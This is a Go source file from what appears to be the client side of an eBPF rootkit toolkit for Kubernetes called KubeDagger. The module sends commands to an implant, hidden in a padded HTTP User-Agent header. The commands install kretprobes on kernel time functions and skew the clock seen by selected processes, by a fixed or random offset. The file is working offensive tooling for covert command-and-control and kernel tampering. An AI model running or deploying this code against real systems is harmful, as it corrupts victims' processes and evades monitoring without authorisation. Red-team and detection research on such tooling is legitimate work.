package timeskew

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type TimeskewResult struct {
	Mode    string       `json:"mode"`
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, pids, offset, mode, output string) error {
	var result *TimeskewResult

	switch mode {
	case "fixed":
		result = fixedSkew(target, pids, offset)
	case "random":
		result = randomSkew(target, pids, offset)
	default:
		return fmt.Errorf("unsupported mode: %s (use fixed or random)", mode)
	}

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func fixedSkew(target, pids, offset string) *TimeskewResult {
	result := &TimeskewResult{Mode: "fixed"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"hook_ktime_get_real",
			"kretprobe on ktime_get_real_ts64 to intercept time reads for target PIDs",
			"timeskew_hook_ktime",
		},
		{
			"configure_pid_targets",
			"populate BPF map with PIDs whose time perception should be skewed",
			"timeskew_set_pids",
		},
		{
			"apply_fixed_offset",
			"add constant time offset to all clock_gettime responses for filtered processes",
			"timeskew_fixed_offset",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + pids + "#" + offset
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)
	return result
}

func randomSkew(target, pids, offset string) *TimeskewResult {
	result := &TimeskewResult{Mode: "random"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"hook_current_kernel_time",
			"kretprobe on current_kernel_time64 for randomized time perturbation",
			"timeskew_hook_current",
		},
		{
			"configure_random_bounds",
			"set max offset range for random time jitter per process",
			"timeskew_set_random_bounds",
		},
		{
			"enable_random_skew",
			"activate per-call random time offset within configured bounds",
			"timeskew_enable_random",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + pids + "#" + offset
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)
	return result
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/timeskew", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
